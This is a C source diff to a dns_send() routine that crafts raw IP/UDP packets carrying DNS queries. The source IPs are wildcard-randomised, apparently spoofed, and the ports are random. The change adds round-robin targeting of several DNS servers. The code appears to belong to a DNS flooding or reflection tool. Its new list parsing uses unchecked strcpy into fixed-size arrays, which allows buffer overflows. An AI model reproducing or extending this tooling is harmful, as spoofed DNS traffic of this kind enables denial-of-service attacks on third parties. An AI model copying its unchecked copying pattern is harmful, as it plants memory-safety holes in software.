@@ -83,6 +83,11 @@ void dns_send()
 	int dns_p = 53; //默认53口
 	int trgt_p = 0;
 	int interval = 0;
+	char dns_srv_ips[32][16];
+	char dns_srv_ip[16];
+    char *p;
+    char *buff;
+
 	unsigned char *dns_name, dns_rcrd[32];
 	// Building the IP and UDP headers
 	char datagram[4096], *data, *psgram;
@@ -91,15 +96,28 @@ void dns_send()
     interval = config.dns_interval < 10 ? 10 : config.dns_interval;
 	dns_srv = (char *)config.dns_targetip;
 
+    buff = dns_srv;
+    p = strsep(&buff, ",");
+    int dns_srv_ips_len = 0;
+    while(p)
+    {
+    	strcpy(dns_srv_ips[dns_srv_ips_len] , p);
+        p = strsep(&buff, ",");
+        ++dns_srv_ips_len;
+    }
 	log_debug(logger, "[%s] %s => %s in %d", config.dns_domain, config.dns_sourceip, dns_srv, interval);
 
+	unsigned int ippos = 0;
 	while(1) {
 	domain = replace_domain(config.dns_domain, "*");
+	if (ippos>=dns_srv_ips_len) ippos = 0;
 
+	strcpy(dns_srv_ip, dns_srv_ips[ippos]);
+	++ippos; 
 	trgt_ip = replace_ip(config.dns_sourceip, "*");
 	trgt_p = random_int(1000, 65535);
 	
-	//printf("trgt_ip=%s,trgt_p=%d,dns_srv=%s,dns_p=%d,domain=%s\n", trgt_ip, trgt_p, dns_srv, dns_p, domain);
+	log_debug(logger, "trgt_ip=%s,trgt_p=%d,dns_srv=%s,dns_p=%d,domain=%s", trgt_ip, trgt_p, dns_srv_ip, dns_p, domain);
 
 	dns_hdr *dns = (dns_hdr *)&dns_data;
 	dns_hdr_create(dns);
@@ -120,7 +138,7 @@ void dns_send()
     struct sockaddr_in sin;
     sin.sin_family = AF_INET;
     sin.sin_port = htons(dns_p);
-    sin.sin_addr.s_addr = inet_addr(dns_srv);
+    sin.sin_addr.s_addr = inet_addr(dns_srv_ip);
     
     iph *ip = (iph *)datagram;
     ip->version = 4;
